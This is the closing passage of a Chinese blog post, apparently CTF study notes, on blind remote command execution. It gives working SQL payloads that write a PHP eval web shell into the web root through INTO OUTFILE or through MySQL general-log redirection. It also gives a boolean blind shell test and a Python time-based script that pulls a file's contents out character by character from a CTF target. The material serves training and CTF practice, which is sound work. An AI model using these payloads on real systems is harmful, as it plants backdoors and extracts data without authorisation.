+<h4 id="sql写马"><a href="#sql写马" class="headerlink" title="sql写马"></a>sql写马</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#MySQL写入（需secure_file_priv为空）</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br><span class="line">#利用日志写入（绕过限制）</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;  # 日志记录<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cut</span> -c 1 /f*` = <span class="string">&quot;a&quot;</span> ];<span class="keyword">then</span> <span class="built_in">echo</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注，脚本by <a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi">Kradress</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="keyword">as</span> urlencode</span><br><span class="line">url  = <span class="string">&#x27;http://1c288549-6ed6-481e-9941-073a0889da5d.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">        payload = <span class="string">&quot;if [ ` ls / | awk &#x27;NR==4&#x27;  |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;</span>.<span class="built_in">format</span>(i,char) <span class="comment">#flag.php</span></span><br><span class="line">        <span class="comment"># payload = &quot;if [ `cat /f149_15_h3r3 | awk &#x27;NR==1&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;.format(i,char)</span></span><br><span class="line">        <span class="comment"># data = &#123;&#x27;cmd&#x27;:payload&#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start = <span class="built_in">int</span>(t.time())</span><br><span class="line">            r = requests.get(url+payload)</span><br><span class="line">            <span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">            end = <span class="built_in">int</span>(t.time()) - start</span><br><span class="line">            <span class="comment"># print(i,char)</span></span><br><span class="line">            <span class="keyword">if</span> end &gt;= <span class="number">3</span>:        </span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>+result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>awk &#39;NR==4&#39;</code>：选取输出结果中的第四行（前三个文件一般都是bin dev etc）</li>
+</ul>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">写入静态文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tar"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">tar</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip-unzip"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">zip&#x2F;unzip</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.</span> <span class="toc-text">带外</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.1.</span> <span class="toc-text">http带外</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E5%B8%A6%E5%A4%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">dns带外</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">1.3.1.</span> <span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dev-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">&#x2F;dev&#x2F;tcp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#etc-profile"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">&#x2F;etc&#x2F;profile</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.3.3.</span> <span class="toc-text">Telnet反弹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.3.4.</span> <span class="toc-text">各种脚本反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#python"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">写马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%86%99%E9%A9%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">sql写马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">盲注</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&text=无回显rce"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&is_video=false&description=无回显rce"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无回显rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&title=无回显rce"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&name=无回显rce&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/&t=无回显rce"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
